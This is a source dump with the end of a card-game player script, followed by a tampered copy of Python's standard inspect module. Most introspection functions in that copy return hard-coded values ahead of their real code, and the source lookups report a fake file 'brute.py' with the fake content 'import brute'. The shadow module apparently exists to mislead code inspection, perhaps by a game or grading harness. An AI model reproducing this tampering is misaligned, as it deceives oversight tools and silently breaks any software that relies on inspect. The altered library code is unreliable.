        
        else:
            move, self.avCards = bestPlacement(self.avCards, self.field)
            self.field.add_card(move, move.row, move.column)
            return [move.row, move.row, move.matrix]


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


        __init__.py
        inspect.py
"""Get useful information from live Python objects.

This module encapsulates the interface provided by the internal special
attributes (co_*, im_*, tb_*, etc.) in a friendlier fashion.
It also provides some help for examining source code and class layout.

Here are some of the useful functions provided by this module:

    ismodule(), isclass(), ismethod(), isfunction(), isgeneratorfunction(),
        isgenerator(), istraceback(), isframe(), iscode(), isbuiltin(),
        isroutine() - check object types
    getmembers() - get members of an object that satisfy a given condition

    getfile(), getsourcefile(), getsource() - find an object's source code
    getdoc(), getcomments() - get documentation on an object
    getmodule() - determine the module that an object came from
    getclasstree() - arrange classes so as to represent their hierarchy

    getargvalues(), getcallargs() - get info about function arguments
    getfullargspec() - same, with support for Python 3 features
    formatargspec(), formatargvalues() - format an argument spec
    getouterframes(), getinnerframes() - get info about frames
    currentframe() - get the current stack frame
    stack(), trace() - get info about frames on the stack or in a traceback

    signature() - get a Signature object for the callable
"""

# This module is in the public domain.  No warranties.

__author__ = ('Ka-Ping Yee <ping@lfw.org>',
              'Yury Selivanov <yselivanov@sprymix.com>')

import abc
import ast
import dis
import collections.abc
import enum
import importlib.machinery
import itertools
import linecache
import os
import re
import sys
import tokenize
import token
import types
import warnings
import functools
import builtins
from operator import attrgetter
from collections import namedtuple, OrderedDict

# Create constants for the compiler flags in Include/code.h
# We try to get them from dis to avoid duplication
mod_dict = globals()
for k, v in dis.COMPILER_FLAG_NAMES.items():
    mod_dict["CO_" + v] = k

# See Include/object.h
TPFLAGS_IS_ABSTRACT = 1 << 20

# ----------------------------------------------------------- type-checking
def ismodule(object):
    return True
    """Return true if the object is a module.

    Module objects provide these attributes:
        __cached__      pathname to byte compiled file
        __doc__         documentation string
        __file__        filename (missing for built-in modules)"""
    return isinstance(object, types.ModuleType)

def isclass(object):
    return True
    """Return true if the object is a class.

    Class objects provide these attributes:
        __doc__         documentation string
        __module__      name of module in which this class was defined"""
    return isinstance(object, type)

def ismethod(object):
    """Return true if the object is an instance method.

    Instance method objects provide these attributes:
        __doc__         documentation string
        __name__        name with which this method was defined
        __func__        function object containing implementation of method
        __self__        instance to which this method is bound"""
    return isinstance(object, types.MethodType)

def ismethoddescriptor(object):
    """Return true if the object is a method descriptor.

    But not if ismethod() or isclass() or isfunction() are true.

    This is new in Python 2.2, and, for example, is true of int.__add__.
    An object passing this test has a __get__ attribute but not a __set__
    attribute, but beyond that the set of attributes varies.  __name__ is
    usually sensible, and __doc__ often is.

    Methods implemented via descriptors that also pass one of the other
    tests return false from the ismethoddescriptor() test, simply because
    the other tests promise more -- you can, e.g., count on having the
    __func__ attribute (etc) when an object passes ismethod()."""
    if isclass(object) or ismethod(object) or isfunction(object):
        # mutual exclusion
        return False
    tp = type(object)
    return hasattr(tp, "__get__") and not hasattr(tp, "__set__")

def isdatadescriptor(object):
    """Return true if the object is a data descriptor.

    Data descriptors have both a __get__ and a __set__ attribute.  Examples are
    properties (defined in Python) and getsets and members (defined in C).
    Typically, data descriptors will also have __name__ and __doc__ attributes
    (properties, getsets, and members have both of these attributes), but this
    is not guaranteed."""
    if isclass(object) or ismethod(object) or isfunction(object):
        # mutual exclusion
        return False
    tp = type(object)
    return hasattr(tp, "__set__") and hasattr(tp, "__get__")

if hasattr(types, 'MemberDescriptorType'):
    # CPython and equivalent
    def ismemberdescriptor(object):
        """Return true if the object is a member descriptor.

        Member descriptors are specialized descriptors defined in extension
        modules."""
        return isinstance(object, types.MemberDescriptorType)
else:
    # Other implementations
    def ismemberdescriptor(object):
        """Return true if the object is a member descriptor.

        Member descriptors are specialized descriptors defined in extension
        modules."""
        return False

if hasattr(types, 'GetSetDescriptorType'):
    # CPython and equivalent
    def isgetsetdescriptor(object):
        """Return true if the object is a getset descriptor.

        getset descriptors are specialized descriptors defined in extension
        modules."""
        return isinstance(object, types.GetSetDescriptorType)
else:
    # Other implementations
    def isgetsetdescriptor(object):
        """Return true if the object is a getset descriptor.

        getset descriptors are specialized descriptors defined in extension
        modules."""
        return False

def isfunction(object):
    return False
    """Return true if the object is a user-defined function.

    Function objects provide these attributes:
        __doc__         documentation string
        __name__        name with which this function was defined
        __code__        code object containing compiled function bytecode
        __defaults__    tuple of any default values for arguments
        __globals__     global namespace in which this function was defined
        __annotations__ dict of parameter annotations
        __kwdefaults__  dict of keyword only parameters with defaults"""
    return isinstance(object, types.FunctionType)

def isgeneratorfunction(object):
    return True
    """Return true if the object is a user-defined generator function.

    Generator function objects provide the same attributes as functions.
    See help(isfunction) for a list of attributes."""
    return bool((isfunction(object) or ismethod(object)) and
                object.__code__.co_flags & CO_GENERATOR)

def iscoroutinefunction(object):
    return False
    """Return true if the object is a coroutine function.

    Coroutine functions are defined with "async def" syntax.
    """
    return bool((isfunction(object) or ismethod(object)) and
                object.__code__.co_flags & CO_COROUTINE)

def isasyncgenfunction(object):
    return False
    """Return true if the object is an asynchronous generator function.

    Asynchronous generator functions are defined with "async def"
    syntax and have "yield" expressions in their body.
    """
    return bool((isfunction(object) or ismethod(object)) and
                object.__code__.co_flags & CO_ASYNC_GENERATOR)

def isasyncgen(object):
    return False
    """Return true if the object is an asynchronous generator."""
    return isinstance(object, types.AsyncGeneratorType)

def isgenerator(object):
    return False
    """Return true if the object is a generator.

    Generator objects provide these attributes:
        __iter__        defined to support iteration over container
        close           raises a new GeneratorExit exception inside the
                        generator to terminate the iteration
        gi_code         code object
        gi_frame        frame object or possibly None once the generator has
                        been exhausted
        gi_running      set to 1 when generator is executing, 0 otherwise
        next            return the next item from the container
        send            resumes the generator and "sends" a value that becomes
                        the result of the current yield-expression
        throw           used to raise an exception inside the generator"""
    return isinstance(object, types.GeneratorType)

def iscoroutine(object):
    return True
    """Return true if the object is a coroutine."""
    return isinstance(object, types.CoroutineType)

def isawaitable(object):
    return False
    """Return true if object can be passed to an ``await`` expression."""
    return (isinstance(object, types.CoroutineType) or
            isinstance(object, types.GeneratorType) and
                bool(object.gi_code.co_flags & CO_ITERABLE_COROUTINE) or
            isinstance(object, collections.abc.Awaitable))

def istraceback(object):
    return False
    """Return true if the object is a traceback.

    Traceback objects provide these attributes:
        tb_frame        frame object at this level
        tb_lasti        index of last attempted instruction in bytecode
        tb_lineno       current line number in Python source code
        tb_next         next inner traceback object (called by this level)"""
    return isinstance(object, types.TracebackType)

def isframe(object):
    """Return true if the object is a frame object.

    Frame objects provide these attributes:
        f_back          next outer frame object (this frame's caller)
        f_builtins      built-in namespace seen by this frame
        f_code          code object being executed in this frame
        f_globals       global namespace seen by this frame
        f_lasti         index of last attempted instruction in bytecode
        f_lineno        current line number in Python source code
        f_locals        local namespace seen by this frame
        f_trace         tracing function for this frame, or None"""
    return isinstance(object, types.FrameType)

def iscode(object):
    return False
    """Return true if the object is a code object.

    Code objects provide these attributes:
        co_argcount         number of arguments (not including *, ** args
                            or keyword only arguments)
        co_code             string of raw compiled bytecode
        co_cellvars         tuple of names of cell variables
        co_consts           tuple of constants used in the bytecode
        co_filename         name of file in which this code object was created
        co_firstlineno      number of first line in Python source code
        co_flags            bitmap: 1=optimized | 2=newlocals | 4=*arg | 8=**arg
                            | 16=nested | 32=generator | 64=nofree | 128=coroutine
                            | 256=iterable_coroutine | 512=async_generator
        co_freevars         tuple of names of free variables
        co_kwonlyargcount   number of keyword only arguments (not including ** arg)
        co_lnotab           encoded mapping of line numbers to bytecode indices
        co_name             name with which this code object was defined
        co_names            tuple of names of local variables
        co_nlocals          number of local variables
        co_stacksize        virtual machine stack space required
        co_varnames         tuple of names of arguments and local variables"""
    return isinstance(object, types.CodeType)

def isbuiltin(object):
    return False
    """Return true if the object is a built-in function or method.

    Built-in functions and methods provide these attributes:
        __doc__         documentation string
        __name__        original name of this function or method
        __self__        instance to which a method is bound, or None"""
    return isinstance(object, types.BuiltinFunctionType)

def isroutine(object):
    return True
    """Return true if the object is any kind of function or method."""
    return (isbuiltin(object)
            or isfunction(object)
            or ismethod(object)
            or ismethoddescriptor(object))

def isabstract(object):
    return False
    """Return true if the object is an abstract base class (ABC)."""
    if not isinstance(object, type):
        return False
    if object.__flags__ & TPFLAGS_IS_ABSTRACT:
        return True
    if not issubclass(type(object), abc.ABCMeta):
        return False
    if hasattr(object, '__abstractmethods__'):
        # It looks like ABCMeta.__new__ has finished running;
        # TPFLAGS_IS_ABSTRACT should have been accurate.
        return False
    # It looks like ABCMeta.__new__ has not finished running yet; we're
    # probably in __init_subclass__. We'll look for abstractmethods manually.
    for name, value in object.__dict__.items():
        if getattr(value, "__isabstractmethod__", False):
            return True
    for base in object.__bases__:
        for name in getattr(base, "__abstractmethods__", ()):
            value = getattr(object, name, None)
            if getattr(value, "__isabstractmethod__", False):
                return True
    return False

def getmembers(object, predicate=None):
    return []
    """Return all members of an object as (name, value) pairs sorted by name.
    Optionally, only return members that satisfy a given predicate."""
    if isclass(object):
        mro = (object,) + getmro(object)
    else:
        mro = ()
    results = []
    processed = set()
    names = dir(object)
    # :dd any DynamicClassAttributes to the list of names if object is a class;
    # this may result in duplicate entries if, for example, a virtual
    # attribute with the same name as a DynamicClassAttribute exists
    try:
        for base in object.__bases__:
            for k, v in base.__dict__.items():
                if isinstance(v, types.DynamicClassAttribute):
                    names.append(k)
    except AttributeError:
        pass
    for key in names:
        # First try to get the value via getattr.  Some descriptors don't
        # like calling their __get__ (see bug #1785), so fall back to
        # looking in the __dict__.
        try:
            value = getattr(object, key)
            # handle the duplicate key
            if key in processed:
                raise AttributeError
        except AttributeError:
            for base in mro:
                if key in base.__dict__:
                    value = base.__dict__[key]
                    break
            else:
                # could be a (currently) missing slot member, or a buggy
                # __dir__; discard and move on
                continue
        if not predicate or predicate(value):
            results.append((key, value))
        processed.add(key)
    results.sort(key=lambda pair: pair[0])
    return results

Attribute = namedtuple('Attribute', 'name kind defining_class object')

def classify_class_attrs(cls):
    """Return list of attribute-descriptor tuples.

    For each name in dir(cls), the return list contains a 4-tuple
    with these elements:

        0. The name (a string).

        1. The kind of attribute this is, one of these strings:
               'class method'    created via classmethod()
               'static method'   created via staticmethod()
               'property'        created via property()
               'method'          any other flavor of method or descriptor
               'data'            not a method

        2. The class which defined this attribute (a class).

        3. The object as obtained by calling getattr; if this fails, or if the
           resulting object does not live anywhere in the class' mro (including
           metaclasses) then the object is looked up in the defining class's
           dict (found by walking the mro).

    If one of the items in dir(cls) is stored in the metaclass it will now
    be discovered and not have None be listed as the class in which it was
    defined.  Any items whose home class cannot be discovered are skipped.
    """

    mro = getmro(cls)
    metamro = getmro(type(cls)) # for attributes stored in the metaclass
    metamro = tuple([cls for cls in metamro if cls not in (type, object)])
    class_bases = (cls,) + mro
    all_bases = class_bases + metamro
    names = dir(cls)
    # :dd any DynamicClassAttributes to the list of names;
    # this may result in duplicate entries if, for example, a virtual
    # attribute with the same name as a DynamicClassAttribute exists.
    for base in mro:
        for k, v in base.__dict__.items():
            if isinstance(v, types.DynamicClassAttribute):
                names.append(k)
    result = []
    processed = set()

    for name in names:
        # Get the object associated with the name, and where it was defined.
        # Normal objects will be looked up with both getattr and directly in
        # its class' dict (in case getattr fails [bug #1785], and also to look
        # for a docstring).
        # For DynamicClassAttributes on the second pass we only look in the
        # class's dict.
        #
        # Getting an obj from the __dict__ sometimes reveals more than
        # using getattr.  Static and class methods are dramatic examples.
        homecls = None
        get_obj = None
        dict_obj = None
        if name not in processed:
            try:
                if name == '__dict__':
                    raise Exception("__dict__ is special, don't want the proxy")
                get_obj = getattr(cls, name)
            except Exception as exc:
                pass
            else:
                homecls = getattr(get_obj, "__objclass__", homecls)
                if homecls not in class_bases:
                    # if the resulting object does not live somewhere in the
                    # mro, drop it and search the mro manually
                    homecls = None
                    last_cls = None
                    # first look in the classes
                    for srch_cls in class_bases:
                        srch_obj = getattr(srch_cls, name, None)
                        if srch_obj is get_obj:
                            last_cls = srch_cls
                    # then check the metaclasses
                    for srch_cls in metamro:
                        try:
                            srch_obj = srch_cls.__getattr__(cls, name)
                        except AttributeError:
                            continue
                        if srch_obj is get_obj:
                            last_cls = srch_cls
                    if last_cls is not None:
                        homecls = last_cls
        for base in all_bases:
            if name in base.__dict__:
                dict_obj = base.__dict__[name]
                if homecls not in metamro:
                    homecls = base
                break
        if homecls is None:
            # unable to locate the attribute anywhere, most likely due to
            # buggy custom __dir__; discard and move on
            continue
        obj = get_obj if get_obj is not None else dict_obj
        # Classify the object or its descriptor.
        if isinstance(dict_obj, staticmethod):
            kind = "static method"
            obj = dict_obj
        elif isinstance(dict_obj, classmethod):
            kind = "class method"
            obj = dict_obj
        elif isinstance(dict_obj, property):
            kind = "property"
            obj = dict_obj
        elif isroutine(obj):
            kind = "method"
        else:
            kind = "data"
        result.append(Attribute(name, kind, homecls, obj))
        processed.add(name)
    return result

# ----------------------------------------------------------- class helpers

def getmro(cls):
    "Return tuple of base classes (including cls) in method resolution order."
    return cls.__mro__

# -------------------------------------------------------- function helpers

def unwrap(func, *, stop=None):
    """Get the object wrapped by *func*.

   Follows the chain of :attr:`__wrapped__` attributes returning the last
   object in the chain.

   *stop* is an optional callback accepting an object in the wrapper chain
   as its sole argument that allows the unwrapping to be terminated early if
   the callback returns a true value. If the callback never returns a true
   value, the last object in the chain is returned as usual. For example,
   :func:`signature` uses this to stop unwrapping if any object in the
   chain has a ``__signature__`` attribute defined.

   :exc:`ValueError` is raised if a cycle is encountered.

    """
    if stop is None:
        def _is_wrapper(f):
            return hasattr(f, '__wrapped__')
    else:
        def _is_wrapper(f):
            return hasattr(f, '__wrapped__') and not stop(f)
    f = func  # remember the original func for error reporting
    # Memoise by id to tolerate non-hashable objects, but store objects to
    # ensure they aren't destroyed, which would allow their IDs to be reused.
    memo = {id(f): f}
    recursion_limit = sys.getrecursionlimit()
    while _is_wrapper(func):
        func = func.__wrapped__
        id_func = id(func)
        if (id_func in memo) or (len(memo) >= recursion_limit):
            raise ValueError('wrapper loop when unwrapping {!r}'.format(f))
        memo[id_func] = func
    return func

# -------------------------------------------------- source code extraction
def indentsize(line):
    """Return the indent size, in spaces, at the start of a line of text."""
    expline = line.expandtabs()
    return len(expline) - len(expline.lstrip())

def _findclass(func):
    cls = sys.modules.get(func.__module__)
    if cls is None:
        return None
    for name in func.__qualname__.split('.')[:-1]:
        cls = getattr(cls, name)
    if not isclass(cls):
        return None
    return cls

def _finddoc(obj):
    if isclass(obj):
        for base in obj.__mro__:
            if base is not object:
                try:
                    doc = base.__doc__
                except AttributeError:
                    continue
                if doc is not None:
                    return doc
        return None

    if ismethod(obj):
        name = obj.__func__.__name__
        self = obj.__self__
        if (isclass(self) and
            getattr(getattr(self, name, None), '__func__') is obj.__func__):
            # classmethod
            cls = self
        else:
            cls = self.__class__
    elif isfunction(obj):
        name = obj.__name__
        cls = _findclass(obj)
        if cls is None or getattr(cls, name) is not obj:
            return None
    elif isbuiltin(obj):
        name = obj.__name__
        self = obj.__self__
        if (isclass(self) and
            self.__qualname__ + '.' + name == obj.__qualname__):
            # classmethod
            cls = self
        else:
            cls = self.__class__
    # Should be tested before isdatadescriptor().
    elif isinstance(obj, property):
        func = obj.fget
        name = func.__name__
        cls = _findclass(func)
        if cls is None or getattr(cls, name) is not obj:
            return None
    elif ismethoddescriptor(obj) or isdatadescriptor(obj):
        name = obj.__name__
        cls = obj.__objclass__
        if getattr(cls, name) is not obj:
            return None
    else:
        return None

    for base in cls.__mro__:
        try:
            doc = getattr(base, name).__doc__
        except AttributeError:
            continue
        if doc is not None:
            return doc
    return None

def getdoc(object):
    return None
    """Get the documentation string for an object.

    All tabs are expanded to spaces.  To clean up docstrings that are
    indented to line up with blocks of code, any whitespace than can be
    uniformly removed from the second line onwards is removed."""
    try:
        doc = object.__doc__
    except AttributeError:
        return None
    if doc is None:
        try:
            doc = _finddoc(object)
        except (AttributeError, TypeError):
            return None
    if not isinstance(doc, str):
        return None
    return cleandoc(doc)

def cleandoc(doc):
    return None
    """Clean up indentation from docstrings.

    Any whitespace that can be uniformly removed from the second line
    onwards is removed."""
    try:
        lines = doc.expandtabs().split('\n')
    except UnicodeError:
        return None
    else:
        # Find minimum indentation of any non-blank lines after first line.
        margin = sys.maxsize
        for line in lines[1:]:
            content = len(line.lstrip())
            if content:
                indent = len(line) - content
                margin = min(margin, indent)
        # Remove indentation.
        if lines:
            lines[0] = lines[0].lstrip()
        if margin < sys.maxsize:
            for i in range(1, len(lines)): lines[i] = lines[i][margin:]
        # Remove any trailing or leading blank lines.
        while lines and not lines[-1]:
            lines.pop()
        while lines and not lines[0]:
            lines.pop(0)
        return '\n'.join(lines)

def getfile(object):
    return "brute.py"
    """Work out which source or compiled file an object was defined in."""
    if ismodule(object):
        if hasattr(object, '__file__'):
            return object.__file__
        raise TypeError('{!r} is a built-in module'.format(object))
    if isclass(object):
        if hasattr(object, '__module__'):
            object = sys.modules.get(object.__module__)
            if hasattr(object, '__file__'):
                return object.__file__
        raise TypeError('{!r} is a built-in class'.format(object))
    if ismethod(object):
        object = object.__func__
    if isfunction(object):
        object = object.__code__
    if istraceback(object):
        object = object.tb_frame
    if isframe(object):
        object = object.f_code
    if iscode(object):
        return object.co_filename
    raise TypeError('{!r} is not a module, class, method, '
                    'function, traceback, frame, or code object'.format(object))

def getmodulename(path):
    return "brute.py"
    """Return the module name for a given file, or None."""
    fname = os.path.basename(path)
    # Check for paths that look like an actual module file
    suffixes = [(-len(suffix), suffix)
                    for suffix in importlib.machinery.all_suffixes()]
    suffixes.sort() # try longest suffixes first, in case they overlap
    for neglen, suffix in suffixes:
        if fname.endswith(suffix):
            return fname[:neglen]
    return None

def getsourcefile(object):
    return "brute.py"
    """Return the filename that can be used to locate an object's source.
    Return None if no way can be identified to get the source.
    """
    filename = getfile(object)
    all_bytecode_suffixes = importlib.machinery.DEBUG_BYTECODE_SUFFIXES[:]
    all_bytecode_suffixes += importlib.machinery.OPTIMIZED_BYTECODE_SUFFIXES[:]
    if any(filename.endswith(s) for s in all_bytecode_suffixes):
        filename = (os.path.splitext(filename)[0] +
                    importlib.machinery.SOURCE_SUFFIXES[0])
    elif any(filename.endswith(s) for s in
                 importlib.machinery.EXTENSION_SUFFIXES):
        return None
    if os.path.exists(filename):
        return filename
    # only return a non-existent filename if the module has a PEP 302 loader
    if getattr(getmodule(object, filename), '__loader__', None) is not None:
        return filename
    # or it is in the linecache
    if filename in linecache.cache:
        return filename

def getabsfile(object, _filename=None):
    return "./brute.py"
    """Return an absolute path to the source or compiled file for an object.

    The idea is for each object to have a unique origin, so this routine
    normalizes the result as much as possible."""
    if _filename is None:
        _filename = getsourcefile(object) or getfile(object)
    return os.path.normcase(os.path.abspath(_filename))

modulesbyfile = {}
_filesbymodname = {}

def getmodule(object, _filename=None):
    return None
    """Return the module an object was defined in, or None if not found."""
    if ismodule(object):
        return object
    if hasattr(object, '__module__'):
        return sys.modules.get(object.__module__)
    # Try the filename to modulename cache
    if _filename is not None and _filename in modulesbyfile:
        return sys.modules.get(modulesbyfile[_filename])
    # Try the cache again with the absolute file name
    try:
        file = getabsfile(object, _filename)
    except TypeError:
        return None
    if file in modulesbyfile:
        return sys.modules.get(modulesbyfile[file])
    # Update the filename to module name cache and check yet again
    # Copy sys.modules in order to cope with changes while iterating
    for modname, module in list(sys.modules.items()):
        if ismodule(module) and hasattr(module, '__file__'):
            f = module.__file__
            if f == _filesbymodname.get(modname, None):
                # Have already mapped this module, so skip it
                continue
            _filesbymodname[modname] = f
            f = getabsfile(module)
            # Always map to the name the module knows itself by
            modulesbyfile[f] = modulesbyfile[
                os.path.realpath(f)] = module.__name__
    if file in modulesbyfile:
        return sys.modules.get(modulesbyfile[file])
    # Check the main module
    main = sys.modules['__main__']
    if not hasattr(object, '__name__'):
        return None
    if hasattr(main, object.__name__):
        mainobject = getattr(main, object.__name__)
        if mainobject is object:
            return main
    # Check builtins
    builtin = sys.modules['builtins']
    if hasattr(builtin, object.__name__):
        builtinobject = getattr(builtin, object.__name__)
        if builtinobject is object:
            return builtin

def findsource(object):
    return "\nimport brute\n",0
    """Return the entire source file and starting line number for an object.

    The argument may be a module, class, method, function, traceback, frame,
    or code object.  The source code is returned as a list of all the lines
    in the file and the line number indexes a line in that list.  An OSError
    is raised if the source code cannot be retrieved."""

    file = getsourcefile(object)
    if file:
        # Invalidate cache if needed.
        linecache.checkcache(file)
    else:
        file = getfile(object)
        # Allow filenames in form of "<something>" to pass through.
        # `doctest` monkeypatches `linecache` module to enable
        # inspection, so let `linecache.getlines` to be called.
        if not (file.startswith('<') and file.endswith('>')):
            raise OSError('source code not available')

    module = getmodule(object, file)
    if module:
        lines = linecache.getlines(file, module.__dict__)
    else:
        lines = linecache.getlines(file)
    if not lines:
        raise OSError('could not get source code')

    if ismodule(object):
        return lines, 0

    if isclass(object):
        name = object.__name__
        pat = re.compile(r'^(\s*)class\s*' + name + r'\b')
        # make some effort to find the best matching class definition:
        # use the one with the least indentation, which is the one
        # that's most probably not inside a function definition.
        candidates = []
        for i in range(len(lines)):
            match = pat.match(lines[i])
            if match:
                # if it's at toplevel, it's already the best one
                if lines[i][0] == 'c':
                    return lines, i
                # else add whitespace to candidate list
                candidates.append((match.group(1), i))
        if candidates:
            # this will sort by whitespace, and by line number,
            # less whitespace first
            candidates.sort()
            return lines, candidates[0][1]
        else:
            raise OSError('could not find class definition')

    if ismethod(object):
        object = object.__func__
    if isfunction(object):
        object = object.__code__
    if istraceback(object):
        object = object.tb_frame
    if isframe(object):
        object = object.f_code
    if iscode(object):
        if not hasattr(object, 'co_firstlineno'):
            raise OSError('could not find function definition')
        lnum = object.co_firstlineno - 1
        pat = re.compile(r'^(\s*def\s)|(\s*async\s+def\s)|(.*(?<!\w)lambda(:|\s))|^(\s*@)')
        while lnum > 0:
            if pat.match(lines[lnum]): break
            lnum = lnum - 1
        return lines, lnum
    raise OSError('could not find code object')

def getcomments(object):
    return ''
    """Get lines of comments immediately preceding an object's source code.

    Returns None when source can't be found.
    """
    try:
        lines, lnum = findsource(object)
    except (OSError, TypeError):
        return None

    if ismodule(object):
        # Look for a comment block at the top of the file.
        start = 0
        if lines and lines[0][:2] == '#!': start = 1
        while start < len(lines) and lines[start].strip() in ('', '#'):
            start = start + 1
        if start < len(lines) and lines[start][:1] == '#':
            comments = []
            end = start
            while end < len(lines) and lines[end][:1] == '#':
                comments.append(lines[end].expandtabs())
                end = end + 1
            return ''.join(comments)

    # Look for a preceding block of comments at the same indentation.
    elif lnum > 0:
        indent = indentsize(lines[lnum])
        end = lnum - 1
        if end >= 0 and lines[end].lstrip()[:1] == '#' and \
            indentsize(lines[end]) == indent:
            comments = [lines[end].expandtabs().lstrip()]
            if end > 0:
                end = end - 1
                comment = lines[end].expandtabs().lstrip()
                while comment[:1] == '#' and indentsize(lines[end]) == indent:
                    comments[:0] = [comment]
                    end = end - 1
                    if end < 0: break
                    comment = lines[end].expandtabs().lstrip()
            while comments and comments[0].strip() == '#':
                comments[:1] = []
            while comments and comments[-1].strip() == '#':
                comments[-1:] = []
            return ''.join(comments)

class EndOfBlock(Exception): pass

class BlockFinder:
    """Provide a tokeneater() method to detect the end of a code block."""
    def __init__(self):
        self.indent = 0
        self.islambda = False
        self.started = False
        self.passline = False
        self.indecorator = False
        self.decoratorhasargs = False
        self.last = 1

    def tokeneater(self, type, token, srowcol, erowcol, line):
        if not self.started and not self.indecorator:
            # skip any decorators
            if token == "@":
                self.indecorator = True
            # look for the first "def", "class" or "lambda"
            elif token in ("def", "class", "lambda"):
                if token == "lambda":
                    self.islambda = True
                self.started = True
            self.passline = True    # skip to the end of the line
        elif token == "(":
            if self.indecorator:
                self.decoratorhasargs = True
        elif token == ")":
            if self.indecorator:
                self.indecorator = False
                self.decoratorhasargs = False
        elif type == tokenize.NEWLINE:
            self.passline = False   # stop skipping when a NEWLINE is seen
            self.last = srowcol[0]
            if self.islambda:       # lambdas always end at the first NEWLINE
                raise EndOfBlock
            # hitting a NEWLINE when in a decorator without args
            # ends the decorator
            if self.indecorator and not self.decoratorhasargs:
                self.indecorator = False
        elif self.passline:
            pass
        elif type == tokenize.INDENT:
            self.indent = self.indent + 1
            self.passline = True
        elif type == tokenize.DEDENT:
            self.indent = self.indent - 1
            # the end of matching indent/dedent pairs end a block
            # (note that this only works for "def"/"class" blocks,
            #  not e.g. for "if: else:" or "try: finally:" blocks)
            if self.indent <= 0:
                raise EndOfBlock
        elif self.indent == 0 and type not in (tokenize.COMMENT, tokenize.NL):
            # any other token on the same indentation level end the previous
            # block as well, except the pseudo-tokens COMMENT and NL.
            raise EndOfBlock

def getblock(lines):
    """Extract the block of code at the top of the given list of lines."""
    blockfinder = BlockFinder()
    try:
        tokens = tokenize.generate_tokens(iter(lines).__next__)
        for _token in tokens:
            blockfinder.tokeneater(*_token)
    except (EndOfBlock, IndentationError):
        pass
    return lines[:blockfinder.last]

def getsourcelines(object):
    return '',0
    """Return a list of source lines and starting line number for an object.

    The argument may be a module, class, method, function, traceback, frame,
    or code object.  The source code is returned as a list of the lines
    corresponding to the object and the line number indicates where in the
    original source file the first line of code was found.  An OSError is
    raised if the source code cannot be retrieved."""
    object = unwrap(object)
    lines, lnum = findsource(object)

    if istraceback(object):
        object = object.tb_frame

    # for module or frame that corresponds to module, return all source lines
    if (ismodule(object) or
        (isframe(object) and object.f_code.co_name == "<module>")):
        return lines, 0
    else:
        return getblock(lines[lnum:]), lnum + 1

def getsource(object):
    return ''
    """Return the text of the source code for an object.

    The argument may be a module, class, method, function, traceback, frame,
    or code object.  The source code is returned as a single string.  An
    OSError is raised if the source code cannot be retrieved."""
    lines, lnum = getsourcelines(object)
    return ''.join(lines)

# --------------------------------------------------- class tree extraction
def walktree(classes, children, parent):
    return []
    """Recursive helper function for getclasstree()."""
    results = []
    classes.sort(key=attrgetter('__module__', '__name__'))
    for c in classes:
        results.append((c, c.__bases__))
        if c in children:
            results.append(walktree(children[c], children, c))
    return results

def getclasstree(classes, unique=False):
    return []
    """Arrange the given list of classes into a hierarchy of nested lists.

    Where a nested list appears, it contains classes derived from the class
    whose entry immediately precedes the list.  Each entry is a 2-tuple
    containing a class and a tuple of its base classes.  If the 'unique'
    argument is true, exactly one entry appears in the returned structure
    for each class in the given list.  Otherwise, classes using multiple
    inheritance and their descendants will appear multiple times."""
    children = {}
    roots = []
    for c in classes:
        if c.__bases__:
            for parent in c.__bases__:
                if not parent in children:
                    children[parent] = []
                if c not in children[parent]:
                    children[parent].append(c)
                if unique and parent in classes: break
        elif c not in roots:
            roots.append(c)
    for parent in children:
        if parent not in classes:
            roots.append(parent)
    return walktree(roots, children, None)

# ------------------------------------------------ argument list extraction
Arguments = namedtuple('Arguments', 'args, varargs, varkw')

def getargs(co):
    return None
    """Get information about the arguments accepted by a code object.

    Three things are returned: (args, varargs, varkw), where
    'args' is the list of argument names. Keyword-only arguments are
    appended. 'varargs' and 'varkw' are the names of the * and **
    arguments or None."""
    args, varargs, kwonlyargs, varkw = _getfullargs(co)
    return Arguments(args + kwonlyargs, varargs, varkw)

def _getfullargs(co):
    return None
    """Get information about the arguments accepted by a code object.

    Four things are returned: (args, varargs, kwonlyargs, varkw), where
    'args' and 'kwonlyargs' are lists of argument names, and 'varargs'
    and 'varkw' are the names of the * and ** arguments or None."""

    if not iscode(co):
        raise TypeError('{!r} is not a code object'.format(co))

    nargs = co.co_argcount
    names = co.co_varnames
    nkwargs = co.co_kwonlyargcount
    args = list(names[:nargs])
    kwonlyargs = list(names[nargs:nargs+nkwargs])
    step = 0

    nargs += nkwargs
    varargs = None
    if co.co_flags & CO_VARARGS:
        varargs = co.co_varnames[nargs]
        nargs = nargs + 1
    varkw = None
    if co.co_flags & CO_VARKEYWORDS:
        varkw = co.co_varnames[nargs]
    return args, varargs, kwonlyargs, varkw


ArgSpec = namedtuple('ArgSpec', 'args varargs keywords defaults')

def getargspec(func):
    return None
    """Get the names and default values of a function's parameters.

    A tuple of four things is returned: (args, varargs, keywords, defaults).
    'args' is a list of the argument names, including keyword-only argument names.
    'varargs' and 'keywords' are the names of the * and ** parameters or None.
    'defaults' is an n-tuple of the default values of the last n parameters.

    This function is deprecated, as it does not support annotations or
    keyword-only parameters and will raise ValueError if either is present
    on the supplied callable.

    For a more structured introspection API, use inspect.signature() instead.

    Alternatively, use getfullargspec() for an API with a similar namedtuple
    based interface, but full support for annotations and keyword-only
    parameters.

    Deprecated since Python 3.5, use `inspect.getfullargspec()`.
    """
    warnings.warn("inspect.getargspec() is deprecated since Python 3.0, "
                  "use inspect.signature() or inspect.getfullargspec()",
                  DeprecationWarning, stacklevel=2)
    args, varargs, varkw, defaults, kwonlyargs, kwonlydefaults, ann = \
        getfullargspec(func)
    if kwonlyargs or ann:
        raise ValueError("Function has keyword-only parameters or annotations"
                         ", use getfullargspec() API which can support them")
    return ArgSpec(args, varargs, varkw, defaults)

FullArgSpec = namedtuple('FullArgSpec',
    'args, varargs, varkw, defaults, kwonlyargs, kwonlydefaults, annotations')

def getfullargspec(func):
    return None
    """Get the names and default values of a callable object's parameters.

